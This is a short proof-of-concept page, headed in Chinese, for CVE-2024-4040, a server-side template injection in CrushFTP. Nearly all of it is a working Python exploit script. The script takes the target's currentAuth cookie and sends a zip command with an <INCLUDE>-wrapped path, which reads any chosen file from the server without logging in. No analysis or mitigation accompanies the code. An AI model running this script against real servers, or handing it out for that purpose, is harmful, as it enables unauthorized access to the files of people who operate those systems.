## CrushFTP服务器端模板注入(CVE-2024-4040)

## poc
```python
import requests
import argparse

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

def get_cookies(url):
    try:
        session = requests.Session()
        response = session.get(url)
        if response.status_code != 200:
            raise Exception("Failed to connect to the server")
        session.cookies.get_dict()
        return session.cookies.get_dict()
    except Exception as e:
        print(FAIL + "Error: " + str(e) + ENDC)
        quit()

def exploit(url, cookies, path):
    try:
        if not path.startswith("/") or not path.endswith("/"):
            raise Exception("Invalid path format. Path should start and end with '/'")
        url = url + "/WebInterface/function/?command=zip&c2f=" + cookies['currentAuth'] + "&path=<INCLUDE>" + path + "</INCLUDE>&names=*"
        response = requests.get(url, cookies=cookies)
        if response.status_code != 200:
            raise Exception("Failed to connect to the server")
        return response.text
    except Exception as e:
        print(FAIL + "Error: " + str(e) + ENDC)
        quit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL of the target", required=True)
    parser.add_argument("-p", "--path", help="Path to the file to read", required=True)
    args = parser.parse_args()
    url = args.url
    path = args.path
    if not url.startswith("http"):
        print(WARNING + "URL should start with 'http' or 'https'")
        quit()
    cookies = get_cookies(url)
    if 'currentAuth' not in cookies:
        print(WARNING + "Not vulnerable" + ENDC)
        quit()
    else:
        print(OKCYAN + exploit(url, cookies, path) + ENDC)
```
